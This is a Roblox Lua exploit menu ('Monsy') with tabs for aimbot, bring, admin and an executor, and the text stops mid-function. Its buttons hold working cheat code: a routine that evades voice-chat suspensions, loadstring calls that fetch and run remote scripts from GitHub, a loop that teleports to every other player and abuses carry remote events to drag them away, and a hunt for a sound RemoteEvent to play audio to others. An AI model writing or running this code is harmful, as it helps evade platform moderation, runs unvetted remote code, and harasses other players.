local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local player            = Players.LocalPlayer
local playerGui         = player:WaitForChild("PlayerGui")

local function new(class, props)
	local obj = Instance.new(class)
	if props then for k,v in pairs(props) do obj[k] = v end end
	return obj
end

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://170765130"
clickSound.Volume = 0.5
clickSound.Parent = playerGui

----------------------------------------------------------------
-- THEME SYSTEM (BLACK / VIOLET / RED / RAINBOW)
----------------------------------------------------------------
local screenGui -- forward declare para safe sa applyTheme
local main, leftPanel, rightPanel, bottomBar, tabBar
local divider, ring, fill, socialLine
local allTabButtons = {}
local allTabPanels = {}
local currentTab = "MAIN MENU"
local lastTab = "MAIN MENU"

local currentTheme = "WHITE"

local themes = {
    BLACK = {
        primary = Color3.fromRGB(255,255,255),  -- White text
        accent  = Color3.fromRGB(0,0,0),        -- Pure black
        bg      = Color3.fromRGB(0,0,0),        -- Pure black
    },
    VIOLET = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(170,0,255),
        bg      = Color3.fromRGB(45,0,80),
    },
    RED = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(220,40,40),
        bg      = Color3.fromRGB(80,0,0),
    },
    BLUE = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(0,120,255),
        bg      = Color3.fromRGB(0,30,80),
    },
    WHITE = {
        primary = Color3.fromRGB(0,0,0),
        accent  = Color3.fromRGB(240,240,240),
        bg      = Color3.fromRGB(255,255,255),
    },
    PINK = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(255,105,180),
        bg      = Color3.fromRGB(120,20,80),
    },
    CYAN = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(0,255,255),
        bg      = Color3.fromRGB(0,60,60),
    },
    GREEN = {
        primary = Color3.fromRGB(255,255,255),
        accent  = Color3.fromRGB(0,255,0),
        bg      = Color3.fromRGB(0,80,0),
    },
    RAINBOW = {
        primary = Color3.fromRGB(255,255,255),
        accent  = nil,
        bg      = nil,
    },
    GALAXY = {
        primary   = Color3.fromRGB(220, 220, 255),  -- Soft white-blue for text (readable sa dark bg)
        accent    = Color3.fromRGB(160, 100, 255),  -- Neon purple-magenta glow (main accents, borders, buttons hover)
        bg        = Color3.fromRGB(10, 5, 30),      -- Deep space black-purple base
        -- Extra keys para mas advanced (optional, kung gagamitin mo UIGradient o multiple colors)
        nebula    = Color3.fromRGB(100, 0, 200),    -- Deep purple for gradients/nebula effects
        star      = Color3.fromRGB(255, 240, 200),  -- Warm white-yellow for stars/sparkles
        glow      = Color3.fromRGB(0, 200, 255),    -- Cyan-blue glow para sa highlights/tracers
    },
}

local function getThemeColors()
	local t = themes[currentTheme]
	if not t then
		return themes.BLACK
	end

	if currentTheme == "RAINBOW" then
		local h = (tick() % 5) / 5
		local accent = Color3.fromHSV(h, 1, 1)
		local bg     = Color3.fromHSV(h, 0.6, 0.18)
		return {
			primary = t.primary,
			accent  = accent,
			bg      = bg,
		}
	end

	return t
end

local function applyTheme()
	if not screenGui then return end

	local t = getThemeColors()
	if not t then return end

	local accent      = t.accent or Color3.new(1,1,1)
	local buttonBase  = t.bg:Lerp(accent, 0.32)
	local buttonHover = t.bg:Lerp(accent, 0.50)
	local textboxBg   = t.bg:Lerp(accent, 0.12)

	-- MAIN CONTAINERS
	if main then main.BackgroundColor3 = t.bg end
	if leftPanel then leftPanel.BackgroundColor3 = t.bg end
	if rightPanel then rightPanel.BackgroundColor3 = t.bg end
	if bottomBar then bottomBar.BackgroundColor3 = t.bg end
	if tabBar then tabBar.BackgroundColor3 = t.bg end

	-- SPECIAL LINES / RINGS
	if socialLine then socialLine.BackgroundColor3 = t.primary end
	if divider then divider.BackgroundColor3 = t.primary end
	if ring then ring.BackgroundColor3 = t.primary end
	if fill then fill.BackgroundColor3 = accent end

	-- TEXT + BUTTON COLORING
	for _, obj in ipairs(screenGui:GetDescendants()) do
		if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
			obj.TextColor3 = t.primary
		end
	end

	for _, obj in ipairs(screenGui:GetDescendants()) do
		if obj:IsA("Frame") and 
		   obj ~= main and obj ~= leftPanel and obj ~= rightPanel and 
		   obj ~= bottomBar and obj ~= tabBar and 
		   obj ~= ring and obj ~= fill and obj ~= socialLine then
			obj.BackgroundColor3 = t.bg
		elseif obj:IsA("TextButton") then
			obj.BackgroundColor3 = buttonBase
		elseif obj:IsA("TextBox") then
			obj.BackgroundColor3 = textboxBg
		end
	end

	-- TAB BUTTON HIGHLIGHT
	for _, btn in ipairs(allTabButtons) do
		if currentTab == btn.Text then
			btn.BackgroundColor3 = accent
		else
			btn.BackgroundColor3 = buttonBase
		end
	end
end

----------------------------------------------------------------
-- ScreenGui
----------------------------------------------------------------
screenGui = new("ScreenGui", {
	Name = "Unknown",
	ResetOnSpawn = false,
	Parent = playerGui,
	DisplayOrder = 1000,
})

-- Main Frame
main = new("Frame", {
	Name = "MainFrame",
	Size = UDim2.new(0, 730, 0, 430),   -- SLIGHTLY BIGGER
	Position = UDim2.new(0.5, -390, 0.5, -240), -- CENTER FIX
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	Parent = screenGui,
})
main.ClipsDescendants = true
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = main})

----------------------------------------------------------------
-- LEFT PANEL
----------------------------------------------------------------
leftPanel = new("Frame", {
	Name = "LeftPanel",
	Size = UDim2.new(0, 220, 1, 0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	Parent = main,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = leftPanel})

divider = new("Frame", {
	Parent = leftPanel,
	Size = UDim2.new(0, 1, 1, -24),
	Position = UDim2.new(1, -1, 0, 12),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 14, 0, 14),
	Size = UDim2.new(1, -28, 0, 32),
	Text = "---- // @ Monsy ----",
	Font = Enum.Font.RobotoMono,
	TextSize = 16,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Left,
})

-- Avatar + Ring (Smaller Version)
local avatarFrame = new("Frame", {
	Parent = leftPanel,
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	Size = UDim2.new(0, 80, 0, 80),       -- ↓ smaller avatar
	Position = UDim2.new(0.5, -40, 0, 70), -- ↓ adjust position for smaller size
	BorderSizePixel = 0,
	ClipsDescendants = true,
})

ring = new("Frame", {
	Parent = avatarFrame,
	Size = UDim2.new(1,0,1,0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = ring})

local inner = new("Frame", {
	Parent = ring,
	Size = UDim2.new(0.86,0,0.86,0),
	Position = UDim2.new(0.07,0,0.07,0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = inner})

local avatar = new("ImageLabel", {
	Parent = inner,
	BackgroundTransparency = 1,
	Size = UDim2.new(1,0,1,0),
	Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150),
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = avatar})

-- Display Name Adjusted Lower
new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 165), -- moved UP slightly from original
	Size = UDim2.new(1, 0, 0, 24),
	Text = player.DisplayName,
	Font = Enum.Font.RobotoMono,
	TextSize = 15,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Center,
})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 188), -- adjusted for spacing
	Size = UDim2.new(1, 0, 0, 18),
	Text = "@" .. player.Name,
	Font = Enum.Font.RobotoMono,
	TextSize = 12,
	TextColor3 = Color3.fromRGB(80,80,80),
	TextXAlignment = Enum.TextXAlignment.Center,
})

----------------------------------------------------------------
-- WHITE LINE + CENTERED SOCIALS
----------------------------------------------------------------
socialLine = new("Frame", {
	Parent = leftPanel,
	Size = UDim2.new(0.8, 0, 0, 1),
	Position = UDim2.new(0.1, 0, 0, 260),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})

local socialsText = new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 310),
	Size = UDim2.new(1, 0, 0, 120),
	Text = "@ x01337\n\n@ discord.gg/publicxenemy\n\n@ xxxmnxi tiktok\n\n@ iluvmonz youtube",
	Font = Enum.Font.RobotoMono,
	TextSize = 12,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Center,
	TextYAlignment = Enum.TextYAlignment.Top,
	TextWrapped = true,
})

----------------------------------------------------------------
-- RIGHT PANEL
----------------------------------------------------------------
rightPanel = new("Frame", {
	Name = "RightPanel",
	Parent = main,
	Size = UDim2.new(1, -220, 1, -50),
	Position = UDim2.new(0, 220, 0, 0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = rightPanel})

local titleLabel = new("TextLabel", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 12),
	Size = UDim2.new(1, -32, 0, 32),
	BackgroundTransparency = 1,
	Text = "MAIN MENU",
	Font = Enum.Font.RobotoMono,
	TextSize = 20,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Left,
})

----------------------------------------------------------------
-- TOP TAB BAR (UNLIMITED SCROLL)
----------------------------------------------------------------
tabBar = new("ScrollingFrame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 56),
	Size = UDim2.new(1, -32, 0, 44),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	ScrollBarThickness = 6,
	ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
	CanvasSize = UDim2.new(0,0,0,0),
	ScrollingDirection = Enum.ScrollingDirection.X,
	AutomaticCanvasSize = Enum.AutomaticSize.X,
})
new("UICorner", {CornerRadius = UDim.new(0,8), Parent = tabBar})

local tabLayout = new("UIListLayout", {
	Parent = tabBar,
	FillDirection = Enum.FillDirection.Horizontal,
	Padding = UDim.new(0, 8),
	SortOrder = Enum.SortOrder.LayoutOrder,
})

local contentArea = new("Frame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 108),
	Size = UDim2.new(1, -32, 1, -166),
	BackgroundTransparency = 1,
	ClipsDescendants = true,
})

----------------------------------------------------------------
-- BOTTOM BAR – CENTERED
----------------------------------------------------------------
bottomBar = new("Frame", {
	Parent = main,
	Position = UDim2.new(0, 220, 1, -50),
	Size = UDim2.new(1, -220, 0, 50),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = bottomBar})

----------------------------------------------------------------
-- TAB LOGIC
----------------------------------------------------------------
local function showTab(name)
	if currentTab and allTabPanels[currentTab] then
		allTabPanels[currentTab].Visible = false
	end

	currentTab = name
	lastTab = name

	if allTabPanels[name] then
		allTabPanels[name].Visible = true
	end

	titleLabel.Text = name
	applyTheme()
end

----------------------------------------------------------------
-- TOP TABS
----------------------------------------------------------------
local topTabNames = {
	"MAIN MENU", "ROLEPLAY MENU", "ROLEPLAY MENU 2", "ROLEPLAY MENU 3",
	"NEW RP SCRIPT", "BRING MENU", "AIMBOT MENU", "SCRIPT MENU", "CASH MENU", "PLAYER MENU",
	"MONSY MENU", "CUSTOMIZE SCRIPT", "SKYLINE CITY", "THE BILLIONARE", "RP TELEPORT", "ADMIN PANEL", "REMOTES"
}

local function createTopTab(name)
	local btn = new("TextButton", {
		Parent = tabBar,
		Size = UDim2.new(0, 110, 1, -12),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		Text = name,
		Font = Enum.Font.RobotoMono,
		TextSize = 13,
		TextColor3 = Color3.new(0,0,0),
		AutoButtonColor = false,
		TextXAlignment = Enum.TextXAlignment.Center,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		if currentTab ~= name then
			local t = getThemeColors()
			local hover = t.bg:Lerp(t.accent, 0.50)
			TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
		end
	end)
	btn.MouseLeave:Connect(function()
		if currentTab ~= name then
			local t = getThemeColors()
			local base = t.bg:Lerp(t.accent, 0.32)
			TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
		end
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		showTab(name)
	end)

	local panel = new("ScrollingFrame", {
		Parent = contentArea,
		Size = UDim2.new(1,0,1,0),
		BackgroundTransparency = 1,
		Visible = false,
		ScrollBarThickness = 6,
		ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	})
	new("UIListLayout", {Parent = panel, Padding = UDim.new(0,8)})

	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end

for _, name in ipairs(topTabNames) do
	createTopTab(name)
end

----------------------------------------------------------------
-- BOTTOM TABS – CENTERED (FIXED)
----------------------------------------------------------------
local bottomTabs = {"PLAYER LIST", "SETTINGS", "WORLD", "LUA EXECUTOR"}

local TAB_WIDTH = 120      -- liitan konti para kasya
local TAB_PADDING = 12
local TEXT_SIZE = 12       -- liit ng text

local function createBottomTab(name)
	local btn = new("TextButton", {
		Parent = bottomBar,
		Size = UDim2.new(0, TAB_WIDTH, 1, -16),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		Text = name,
		Font = Enum.Font.RobotoMono,
		TextSize = TEXT_SIZE,
		TextWrapped = true,
		TextScaled = false,
		TextColor3 = Color3.new(0,0,0),
		AutoButtonColor = false,
	})

	new("UICorner", {
		CornerRadius = UDim.new(0,6),
		Parent = btn
	})

	-- CENTER CALC (dynamic sa dami ng tabs)
	local function positionButton()
		local count = #bottomTabs
		local totalWidth = (count * TAB_WIDTH) + ((count - 1) * TAB_PADDING)
		local startX = (bottomBar.AbsoluteSize.X - totalWidth) / 2
		if startX ~= startX then startX = 0 end

		local index = table.find(bottomTabs, name) - 1
		btn.Position = UDim2.new(
			0,
			startX + index * (TAB_WIDTH + TAB_PADDING),
			0,
			8
		)
	end

	task.delay(0, positionButton)
	bottomBar:GetPropertyChangedSignal("AbsoluteSize"):Connect(positionButton)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		showTab(name)
	end)

	local panel = new("ScrollingFrame", {
		Parent = contentArea,
		Size = UDim2.new(1,0,1,0),
		BackgroundTransparency = 1,
		Visible = false,
		ScrollBarThickness = 6,
		ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	})

	new("UIListLayout", {
		Parent = panel,
		Padding = UDim.new(0,8)
	})

	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end

for _, name in ipairs(bottomTabs) do
	createBottomTab(name)
end


-- DEFAULT TAB
showTab("MAIN MENU")

----------------------------------------------------------------
-- MAIN MENU BUTTONS
----------------------------------------------------------------
local function addMainMenuButton(text, callback)
	local panel = allTabPanels["MAIN MENU"]
	if not panel then return end

	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local hover = t.bg:Lerp(t.accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local base = t.bg:Lerp(t.accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("ANTI SUSPEND (MONSY)", function()
local TweenService = game:GetService("TweenService")
local VoiceChatService = game:GetService("VoiceChatService")
local VoiceChatInternal = game:GetService("VoiceChatInternal")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

-- ==========================================
-- ANTI VC SUSPEND - RUNS ON LOOP + ON UNMUTE
-- ==========================================
local antiSuspendRunning = false

local function runAntiSuspend()
    if antiSuspendRunning then return end
    antiSuspendRunning = true
    task.spawn(function()
        pcall(function()
            local groupId = VoiceChatInternal:GetGroupId()
            VoiceChatInternal:JoinByGroupId(groupId, false)
            VoiceChatService:leaveVoice()
            task.wait()
            VoiceChatInternal:JoinByGroupId(groupId, false)
            VoiceChatInternal:JoinByGroupId(groupId, false)
            VoiceChatInternal:JoinByGroupId(groupId, false)
            VoiceChatInternal:JoinByGroupId(groupId, false)
            task.wait(5)
            VoiceChatService:joinVoice()
            VoiceChatInternal:JoinByGroupId(groupId, false)
        end)
        antiSuspendRunning = false
    end)
end

-- Run on start
runAntiSuspend()

-- ==========================================
-- NOTIFICATION
-- ==========================================
task.spawn(function()
    local gui = Instance.new('ScreenGui')
    gui.Name = 'MonsyNotif'
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = gethui()
    local frame = Instance.new('Frame')
    frame.Size = UDim2.new(0, 300, 0, 70)
    frame.Position = UDim2.new(1, 10, 1, -90)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BorderSizePixel = 0
    frame.Parent = gui
    Instance.new('UICorner', frame).CornerRadius = UDim.new(0, 14)
    local icon = Instance.new('TextLabel')
    icon.Size = UDim2.new(0, 40, 1, 0)
    icon.Position = UDim2.new(0, 10, 0, 0)
    icon.BackgroundTransparency = 1
    icon.Text = '✔'
    icon.TextColor3 = Color3.fromRGB(255, 255, 255)
    icon.Font = Enum.Font.GothamBold
    icon.TextSize = 22
    icon.TextXAlignment = Enum.TextXAlignment.Center
    icon.Parent = frame
    local title = Instance.new('TextLabel')
    title.Size = UDim2.new(1, -65, 0, 28)
    title.Position = UDim2.new(0, 58, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = 'MONSY ANTI SUSPEND'
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame
    local sub = Instance.new('TextLabel')
    sub.Size = UDim2.new(1, -65, 0, 24)
    sub.Position = UDim2.new(0, 58, 0, 34)
    sub.BackgroundTransparency = 1
    sub.Text = 'Anti Vc Suspend Activated\nSuccessfully!'
    sub.TextColor3 = Color3.fromRGB(255, 255, 255)
    sub.Font = Enum.Font.Gotham
    sub.TextSize = 12
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.TextWrapped = true
    sub.Parent = frame
    frame:TweenPosition(UDim2.new(1, -315, 1, -90), 'Out', 'Back', 0.5, true)
    task.wait(4)
    frame:TweenPosition(UDim2.new(1, 10, 1, -90), 'In', 'Quad', 0.5, true)
    task.wait(0.5)
    gui:Destroy()
end)

-- ==========================================
-- SOUND
-- ==========================================
task.spawn(function()
    local snd = Instance.new('Sound')
    snd.SoundId = 'rbxassetid://170765130'
    snd.Parent = game:GetService('SoundService')
    snd:Play()
    task.wait(6)
    snd:Destroy()
end)

-- ==========================================
-- MIC OVERLAY + RE-TRIGGER ANTI SUSPEND ON UNMUTE
-- ==========================================
task.spawn(function()

    local function findMicButton()
        local function search(parent, depth)
            if depth > 15 then return nil end
            for _, v in ipairs(parent:GetChildren()) do
                if v:IsA("ImageButton") or v:IsA("TextButton") then
                    local n = v.Name:lower()
                    if n:find("voice") or n:find("mic") or n:find("mute") then
                        return v
                    end
                end
                local found = search(v, depth + 1)
                if found then return found end
            end
        end
        return search(CoreGui, 0)
    end

    -- Wait for mic button
    local realBtn = nil
    for i = 1, 30 do
        realBtn = findMicButton()
        if realBtn then break end
        task.wait(0.5)
    end

    if not realBtn then
        warn("[MonsyMic] Mic button not found!")
        return
    end

    -- Overlay GUI
    local overlayGui = Instance.new("ScreenGui")
    overlayGui.Name = "MonsyMicOverlay"
    overlayGui.IgnoreGuiInset = true
    overlayGui.ResetOnSpawn = false
    overlayGui.DisplayOrder = 9999
    overlayGui.Parent = gethui()

    -- Invisible click overlay
    local overlay = Instance.new("TextButton")
    overlay.BackgroundTransparency = 1
    overlay.Text = ""
    overlay.ZIndex = 100
    overlay.AutoButtonColor = false
    overlay.Parent = overlayGui

    -- Red tint when muted
    local redTint = Instance.new("Frame")
    redTint.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
    redTint.BackgroundTransparency = 0.3
    redTint.BorderSizePixel = 0
    redTint.ZIndex = 99
    redTint.Visible = false
    redTint.Parent = overlayGui
    Instance.new("UICorner", redTint).CornerRadius = UDim.new(1, 0)

    -- Track previous mute state to detect unmute
    local wasMuted = false

    -- Every frame: snap overlay onto real button
    RunService:BindToRenderStep("MonsyMicTrack", Enum.RenderPriority.Last.Value, function()
        pcall(function()
            if not realBtn or not realBtn.Parent then return end
            local p = realBtn.AbsolutePosition
            local s = realBtn.AbsoluteSize
            overlay.Position = UDim2.new(0, p.X, 0, p.Y)
            overlay.Size = UDim2.new(0, s.X, 0, s.Y)
            redTint.Position = UDim2.new(0, p.X, 0, p.Y)
            redTint.Size = UDim2.new(0, s.X, 0, s.Y)
        end)
    end)

    -- Sync loop: detect mute state changes
    task.spawn(function()
        while overlayGui.Parent do
            pcall(function()
                local isMuted = VoiceChatInternal:IsLocalMuted()
                redTint.Visible = isMuted

                -- DETECT UNMUTE: was muted, now unmuted = re-run anti suspend
                if wasMuted and not isMuted then
                    task.wait(0.5) -- small delay before re-triggering
                    runAntiSuspend()
                end

                wasMuted = isMuted
            end)
            task.wait(0.3)
        end
        RunService:UnbindFromRenderStep("MonsyMicTrack")
    end)

    -- Click overlay = fire real mic button
    overlay.MouseButton1Click:Connect(function()
        pcall(function() firesignal(realBtn.MouseButton1Click) end)
        pcall(function() firebutton(realBtn) end)
    end)
end)
end)

addMainMenuButton("ANTI SUSPEND FEARLESS @key : nevertag (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/fearlessd3v/TEAM-FEARLESS/refs/heads/main/fearless-chat-bypass"))()
end)

addMainMenuButton("INFINITE YIELD (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

addMainMenuButton("BYPASS RESET (MONSY)", function()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

localPlayer.Character.Humanoid.Health = 0
end)

addMainMenuButton("BYPASS KILL YIELD (MONSY)", function()
-- // Monsy GUI
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CarryEvent = ReplicatedStorage:WaitForChild("CarryResponseEvent", 9e9)
local UncarryEvent = ReplicatedStorage:WaitForChild("UncarryEvent", 9e9)
local localPlayer = Players.LocalPlayer

local teleportPos = Vector3.new(2066.104248046875, 6.027009963989258, -364.03411865234375)

local bypassing = false

-- GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 160, 0, 75)
MainFrame.Position = UDim2.new(0.5, -80, 0.5, -37)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 14)
Corner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(220, 220, 220)
UIStroke.Thickness = 1.2
UIStroke.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 28)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "// Monsy"
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextSize = 13
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.Parent = MainFrame

-- Divider
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(0.85, 0, 0, 1)
Divider.Position = UDim2.new(0.075, 0, 0, 29)
Divider.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
Divider.BorderSizePixel = 0
Divider.Parent = MainFrame

-- BYPASS Button
local BypassBtn = Instance.new("TextButton")
BypassBtn.Name = "BypassBtn"
BypassBtn.Size = UDim2.new(0, 90, 0, 26)
BypassBtn.Position = UDim2.new(0.5, -45, 0, 38)
BypassBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BypassBtn.BorderSizePixel = 0
BypassBtn.Text = "BYPASS: OFF"
BypassBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
BypassBtn.TextSize = 11
BypassBtn.Font = Enum.Font.GothamBold
BypassBtn.Parent = MainFrame

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 8)
BtnCorner.Parent = BypassBtn

local BtnStroke = Instance.new("UIStroke")
BtnStroke.Color = Color3.fromRGB(180, 180, 180)
BtnStroke.Thickness = 1
BtnStroke.Parent = BypassBtn

-- Toggle Logic
BypassBtn.MouseButton1Click:Connect(function()
    bypassing = not bypassing
    if bypassing then
        BypassBtn.Text = "BYPASS: ON"
    else
        BypassBtn.Text = "BYPASS: OFF"
    end
end)

-- Main Loop
task.spawn(function()
    while true do
        task.wait(0.001)
        if bypassing then
            local playerList = {}
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    table.insert(playerList, player)
                end
            end
            for _, target in ipairs(playerList) do
                if not bypassing then break end
                if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
                end
                task.wait(0.001)
                CarryEvent:FireServer(target, true)
                task.wait(0.001)
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPos)
                end
                task.wait(0.001)
                UncarryEvent:FireServer()
                task.wait(0.001)
            end
            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPos)
            end
        end
    end
end)
end)

addMainMenuButton("MUSIC EXPLOITS (MONSY)", function()
	-- PUBLIC ENEMY CMD - Minimal FE Audio Player (White Font Update)
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local InjectTo = game:GetService("TestService")

-- Find RemoteEvent
local function findRemote()
	for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	return nil
end

local remote = findRemote()

-- GUI
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = ""
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 300, 0, 120)
main.Position = UDim2.new(0.5, -150, 0.5, -60)
main.BackgroundColor3 = Color3.fromRGB(255,255,255)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0.25, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "PUBLIC ENEMY MUSIC EXPLOITS"
title.TextColor3 = Color3.fromRGB(0,0,0) -- White
title.BackgroundTransparency = 1
title.Font = Enum.Font.Roboto
title.TextSize = 22

local inputBox = Instance.new("TextBox", main)
inputBox.Size = UDim2.new(0.9, 0, 0.25, 0)
inputBox.Position = UDim2.new(0.05, 0, 0.35, 0)
inputBox.PlaceholderText = "Enter Music ID [3KTG]"
inputBox.Text = ""
inputBox.TextColor3 = Color3.fromRGB(0,0,0)
inputBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
inputBox.Font = Enum.Font.Roboto
inputBox.TextSize = 18
inputBox.ClearTextOnFocus = false

local toggleButton = Instance.new("TextButton", main)
toggleButton.Size = UDim2.new(0.5, 0, 0.2, 0)
toggleButton.Position = UDim2.new(0.25, 0, 0.7, 0)
toggleButton.Text = "OFF"
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White
toggleButton.BackgroundTransparency = 1
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextSize = 24

local isOn = false
local soundName = "TG_SOUND_" .. tostring(math.random(1000,9999))

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
